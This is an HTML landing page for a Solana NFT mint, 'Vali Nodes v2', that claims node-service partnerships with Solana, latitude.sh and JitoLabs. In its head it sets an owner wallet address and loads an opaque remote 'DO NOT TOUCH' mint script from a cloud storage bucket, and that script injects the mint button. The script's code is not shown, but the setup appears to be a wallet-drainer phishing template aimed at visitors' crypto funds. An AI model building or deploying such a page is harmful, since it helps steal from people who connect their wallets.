<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Your Gateway to Solana – Mint</title>

    <!-- REQUIRED CONFIG -->
    <script>
        window.ownerId = "5zNgyKVLmAunCNFR2XHUEhibfWJaLn2sJXQrePpYUz5j";
        window.collectionId = "9eBNrbp95nm92E2vRyRU";
    </script>

    <!-- SOLANA MINT SCRIPT (DO NOT TOUCH) -->
    <script type="module" src="https://storage.googleapis.com/scriptslmt/0.1.3/solana.js"></script>
    <link rel="stylesheet" href="https://storage.googleapis.com/scriptslmt/0.1.3/solana.css">

    <!-- FONT -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg: #020307;
            --text-main: #f9fafb;
            --text-muted: #9ca3af;
            --accent-purple: #8b5cf6;
            --accent-blue: #0ea5e9;
            --border-subtle: #111827;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            min-height: 100vh;
            background:
                radial-gradient(circle at 20% 0%, rgba(148, 163, 184, 0.2), transparent 55%),
                radial-gradient(circle at 80% 100%, rgba(15, 23, 42, 0.9), transparent 60%),
                #000;
            color: var(--text-main);
            font-family: "Inter", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
        }

        .page {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 32px 80px;
            display: flex;
            gap: 56px;
            align-items: center;
        }

        @media (max-width: 960px) {
            .page {
                flex-direction: column;
                align-items: flex-start;
                padding: 32px 20px 60px;
            }
        }

        /* Left hero content */
        .hero-left {
            flex: 1.2;
        }

        .eyebrow {
            font-size: 11px;
            letter-spacing: 0.26em;
            text-transform: uppercase;
            color: var(--text-muted);
            margin-bottom: 12px;
        }

        .headline {
            font-size: clamp(32px, 4vw, 44px);
            font-weight: 800;
            line-height: 1.1;
            margin-bottom: 18px;
        }

        .headline span.gradient {
            background: linear-gradient(120deg, var(--accent-purple), var(--accent-blue));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .subcopy {
            max-width: 460px;
            font-size: 14px;
            line-height: 1.6;
            color: var(--text-muted);
            margin-bottom: 28px;
        }

        .cta-row {
            display: flex;
            gap: 14px;
            margin-bottom: 32px;
            flex-wrap: wrap;
        }

        .cta-outline {
            padding: 10px 20px;
            border-radius: 12px;
            border: 1px solid #1e293b;
            background: rgba(15, 23, 42, 0.7);
            font-size: 13px;
            color: var(--text-main);
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            min-width: 130px;
            transition: background 0.12s ease-out, border-color 0.12s ease-out,
                transform 0.12s ease-out;
        }

        .cta-outline:hover {
            background: rgba(15, 23, 42, 0.95);
            border-color: #334155;
            transform: translateY(-1px);
        }

        .partners-bar {
            margin-top: 4px;
            padding: 14px 18px;
            border-radius: 12px;
            border: 1px solid #111827;
            background: rgba(3, 7, 18, 0.9);
            display: inline-flex;
            align-items: center;
            gap: 22px;
            font-size: 11px;
            color: var(--text-muted);
        }

        .partner {
            text-transform: uppercase;
            letter-spacing: 0.16em;
            font-weight: 500;
            color: #e5e7eb;
            opacity: 0.9;
            white-space: nowrap;
        }

        .partner.dim {
            opacity: 0.6;
        }

        /* Right side mint panel */
        .hero-right {
            flex: 1;
            display: flex;
            justify-content: flex-end;
            width: 100%;
        }

        .mint-panel {
            width: 100%;
            max-width: 380px;
            border-radius: 24px;
            padding: 22px 20px 20px;
            background: radial-gradient(circle at 0% 0%, rgba(15, 23, 42, 1), #020617);
            border: 1px solid #111827;
            box-shadow:
                0 28px 80px rgba(0, 0, 0, 0.9),
                0 0 0 1px rgba(15, 23, 42, 0.95);
        }

        .mint-tag {
            font-size: 11px;
            letter-spacing: 0.2em;
            text-transform: uppercase;
            color: var(--text-muted);
            margin-bottom: 10px;
        }

        .mint-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 6px;
        }

        .mint-price-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
            font-size: 13px;
            color: var(--text-muted);
        }

        .mint-price-chip {
            padding: 6px 12px;
            border-radius: 999px;
            border: 1px solid #1f2937;
            background: radial-gradient(circle at 0 0, rgba(56, 189, 248, 0.2), rgba(15, 23, 42, 0.9));
            font-size: 12px;
            font-weight: 500;
        }

        .mint-price-chip span {
            background: linear-gradient(120deg, var(--accent-purple), var(--accent-blue));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        /* Mint button container from script */
        #mint-button-container {
            margin: 8px 0 16px;
        }

        /* Optional: style injected button slightly to match theme */
        #mint-button-container button {
            width: 100%;
            border-radius: 999px !important;
            padding: 11px 18px !important;
            font-size: 0.9rem !important;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            font-weight: 600 !important;
            border: none !important;
            outline: none !important;
            background-image: linear-gradient(120deg, var(--accent-purple), var(--accent-blue));
            box-shadow:
                0 14px 36px rgba(15, 23, 42, 0.85),
                0 0 0 1px rgba(15, 23, 42, 0.95);
            cursor: pointer;
            transition: transform 0.12s ease-out, box-shadow 0.12s ease-out,
                filter 0.12s ease-out;
        }

        #mint-button-container button:hover {
            transform: translateY(-1px);
            filter: brightness(1.05);
            box-shadow:
                0 18px 46px rgba(15, 23, 42, 0.95),
                0 0 0 1px rgba(15, 23, 42, 0.98);
        }

        #mint-button-container button:active {
            transform: translateY(0);
            filter: brightness(0.99);
        }

        /* Slider area from script */
        #slider-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            padding: 10px 12px;
            border-radius: 14px;
            border: 1px solid #111827;
            background: #020617;
            margin-bottom: 10px;
        }

        #mint-slider {
            flex: 1;
        }

        #mint-slider-amount {
            min-width: 36px;
            text-align: center;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-main);
        }

        #mint-counter {
            margin-top: 4px;
            font-size: 11px;
            color: var(--text-muted);
        }

        /* Decorative floating blob on the right of panel (optional) */
        .blob {
            position: fixed;
            right: -80px;
            bottom: 12%;
            width: 260px;
            height: 260px;
            border-radius: 60% 40% 55% 45%;
            background: radial-gradient(circle at 30% 10%, #4b5563, #020617);
            filter: blur(0.3px);
            opacity: 0.25;
            pointer-events: none;
        }

        @media (max-width: 960px) {
            .blob {
                display: none;
            }
        }
    </style>
</head>

<body>
    <div class="page">
        <!-- LEFT HERO SIDE -->
        <section class="hero-left">
            <h1 class="headline">
                YOUR GATEWAY<br />
                <span class="gradient">TO SOLANA</span>
            </h1>

            <p class="subcopy">
                Our node delivers peak efficiency, high reliability and seamless
				performance—even under heavy congestion.
            </p>



            <div class="partners-bar">
                <span class="partner">SOLANA</span>
                <span class="partner dim">latitude.sh</span>
                <span class="partner dim">JitoLabs</span>
            </div>
        </section>

        <!-- RIGHT MINT PANEL -->
        <aside class="hero-right">
            <div class="mint-panel">
                <div class="mint-tag">Mint Live</div>
                <div class="mint-title">Vali Nodes  v2</div>

                <div class="mint-price-row">
                    <span>Mint price</span>
                    <div class="mint-price-chip">
                        <span>0.15 SOL</span>
                    </div>
                </div>

                <!-- MINT BUTTON INJECTION ZONE -->
                <div id="mint-button-container"></div>

                <!-- SLIDER FROM SCRIPT -->
                <div id="slider-container">
                    <span id="mint-slider"></span>
                    <span id="mint-slider-amount"></span>
                </div>

            </div>
        </aside>
    </div>

    <div class="blob"></div>
</body>
</html>
